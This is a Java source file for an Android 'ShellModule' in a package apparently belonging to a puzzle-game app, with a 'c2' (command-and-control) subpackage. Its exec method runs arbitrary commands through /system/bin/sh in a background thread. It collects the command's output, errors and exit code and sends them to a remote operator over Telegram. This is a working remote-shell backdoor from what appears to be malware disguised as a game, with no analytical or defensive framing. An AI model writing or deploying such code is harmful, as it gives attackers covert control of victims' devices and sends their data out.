package com.gempuzzle.quest.c2.modules;

import com.gempuzzle.quest.c2.TelegramClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public final class ShellModule {

    public static void exec(String cmd) {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
                BufferedReader out = new BufferedReader(new InputStreamReader(p.getInputStream()));
                BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                StringBuilder sb = new StringBuilder("💻 *shell:* `").append(cmd).append("`\n\n");
                String line;
                int lines = 0;
                while ((line = out.readLine()) != null && lines < 100) {
                    sb.append(line).append("\n");
                    lines++;
                }
                while ((line = err.readLine()) != null && lines < 120) {
                    sb.append("⚠ ").append(line).append("\n");
                    lines++;
                }
                p.waitFor();
                sb.append("\n_exit code: ").append(p.exitValue()).append("_");
                String result = sb.toString();
                if (result.length() > 4000) result = result.substring(0, 4000) + "\n... (truncated)";
                TelegramClient.sendMessage(result);
            } catch (Throwable t) {
                TelegramClient.sendMessage("⚠ shell error: " + t.getMessage());
            }
        }).start();
    }

    private ShellModule() {}
}
